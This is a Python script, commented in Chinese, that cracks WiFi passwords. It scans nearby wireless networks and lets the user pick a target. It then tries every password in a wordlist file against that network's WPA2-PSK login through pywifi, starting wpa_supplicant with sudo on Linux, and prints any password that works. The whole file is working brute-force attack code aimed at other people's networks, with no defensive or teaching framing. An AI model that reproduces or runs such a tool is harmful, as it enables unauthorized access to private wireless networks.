import os
import platform
import subprocess
import time

from pywifi import PyWiFi, const, Profile
from tqdm import tqdm
from utils import getsTheRequiredFilesInResource

def start_wpa_supplicant(interface):
    """
    启动 wpa_supplicant 服务（如果尚未运行）
    """
    try:
        # 检查 wpa_supplicant 是否正在运行
        result = subprocess.run(['pgrep', 'wpa_supplicant'], stdout=subprocess.PIPE)
        if result.returncode != 0:
            # wpa_supplicant 未运行，启动它
            cmd = ['sudo', 'wpa_supplicant', '-B', '-i', interface, '-c', '/etc/wpa_supplicant/wpa_supplicant.conf']
            subprocess.run(cmd, check=True)
            print("wpa_supplicant 已启动")
        else:
            print("wpa_supplicant 已在运行")
    except Exception as e:
        print(f"无法启动 wpa_supplicant: {e}")


def scan_wifi(iface):
    """
    扫描周围的WiFi并显示进度条。

    参数:
    iface (obj): 无线网络接口

    返回:
    list: 排序后的周围的WiFi列表
    """
    iface.scan()
    print("---扫描周围WiFi中---")
    for _ in tqdm(range(10), desc="扫描进度", unit="s"):
        time.sleep(1)
    wifi_list = sorted(iface.scan_results(), key=lambda x: x.signal, reverse=True)  # 根据信号强度排序
    for idx, wifi in enumerate(wifi_list):
        try:
            ssid = wifi.ssid.encode("raw_unicode_escape").decode("utf-8", errors="ignore")
        except UnicodeDecodeError:
            ssid = wifi.ssid.encode("raw_unicode_escape").decode("latin-1", errors="ignore")
        signal_strength = str(wifi.signal + 100) + "%"
        print(f"{idx + 1}. WiFi名称: {ssid}, 信号强度: {signal_strength}")
    return wifi_list


def connect_to_wifi(iface, password, ssid):
    """
    尝试使用提供的密码连接到指定的WiFi。

    参数:
    iface (obj): 无线网络接口
    password (str): WiFi密码
    ssid (str): WiFi名称

    返回:
    bool: 是否连接成功
    """
    try:
        profile = Profile()
        profile.ssid = ssid
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.auth = const.AUTH_ALG_OPEN
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        iface.remove_all_network_profiles()
        iface.add_network_profile(profile)
        iface.connect(profile)
        time.sleep(5)
        if iface.status() == const.IFACE_CONNECTED:
            return True
        else:
            iface.disconnect()
            return False
    except Exception as e:
        print(f"连接失败: {e}")
        return False


def select_interface(wifi):
    """
    显示设备上所有可用的网卡并让用户选择一个进行扫描。

    参数:
    wifi (obj): PyWiFi对象

    返回:
    obj: 选择的网卡接口对象
    """
    interfaces = wifi.interfaces()

    if not interfaces:
        print("未找到可用的无线网卡接口。")
        return None

    if len(interfaces) == 1:
        # print(f"找到无线网卡接口: {interfaces[0].name()}")
        return interfaces[0]

    print("设备上可用的网卡如下：")
    for idx, iface in enumerate(interfaces):
        print(f"{idx + 1}. {iface.name()}")

    while True:
        try:
            selection = int(input("请选择要使用的网卡序号: ").strip())
            if 1 <= selection <= len(interfaces):
                return interfaces[selection - 1]
            else:
                print("无效的选择，请输入列表中的有效序号。")
        except ValueError:
            print("请输入有效的数字序号。")


def get_default_password_file():
    """
    获取默认的密码文件路径，根据操作系统选择默认文件名。

    返回:
    str: 密码文件路径
    """
    if platform.system() == "Windows":
        # 获取当前脚本文件的绝对路径
        # 进入到resource文件夹
        resource_folder = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), 'resource')
        # 指纹文件的路径
        password_file = os.path.join(resource_folder, '密码本.txt')
        return password_file
    else:
        password_file = os.path.join(os.path.expanduser("~"), '密码本.txt')
        return password_file
def crack_wifi():
    """
    破解WiFi的函数.
    """
    try:
        wifi = PyWiFi()
        iface = select_interface(wifi)
        if not iface:
            return

        # 启动 wpa_supplicant 服务 (仅限 Linux)
        if platform.system() != "Windows":
            start_wpa_supplicant(iface.name())

        # 检查网卡是否已连接到WiFi
        if iface.status() == const.IFACE_CONNECTED:
            print("请断开WiFi，再尝试运行!")
            status = input("如果断开WiFi可以输入1，退出脚本请按任意键: ")
            if status.strip() == "1":
                iface.disconnect()
                print("---断开WiFi中---")
                time.sleep(1)
        elif iface.status() != const.IFACE_DISCONNECTED:
            print("当前网卡状态异常!!!\n请重新运行")
            return

        wifi_list = scan_wifi(iface)

        wifi_selection = input("请输入想破解的WiFi序号或名称: ").strip()

        # 根据用户输入确定WiFi名称
        if wifi_selection.isdigit():
            wifi_index = int(wifi_selection) - 1
            if 0 <= wifi_index < len(wifi_list):
                wifi_name = wifi_list[wifi_index].ssid.encode("raw_unicode_escape").decode("utf-8", errors="ignore")
            else:
                print("输入的序号无效，请重新运行程序并输入有效的序号。")
                return
        else:
            wifi_name = wifi_selection

        print("---开始破解---")

        specify_password_file = input("是否指定密码本文件路径？（y/n） 默认为 n：").strip().lower()

        if specify_password_file == 'y':
            example_password_file = os.path.join(os.path.dirname(__file__), "其他目录的密码本.txt")
            print(f"例如：{example_password_file}")
            password_file = input("请输入密码本文件路径: ").strip()
            if not os.path.exists(password_file):
                print("密码本文件不存在，请检查路径是否正确。")
                return
        else:
            password_file = getsTheRequiredFilesInResource('密码本.txt')

        with open(password_file, "r", encoding="latin-1") as f:
            passwords = f.readlines()

        try:
            for pwd in tqdm(passwords, desc="破解进度", unit="password", leave=False):
                if connect_to_wifi(iface, pwd.strip(), wifi_name):
                    print(f"破解成功，密码为: {pwd.strip()}")
                    break
            else:
                print("破解失败，未找到正确的密码。")
        except KeyboardInterrupt:
            print("\n操作已取消。")
        finally:
            tqdm._instances.clear()  # 确保所有进度条都被清理

    except KeyboardInterrupt:
        print("\n程序已终止。")
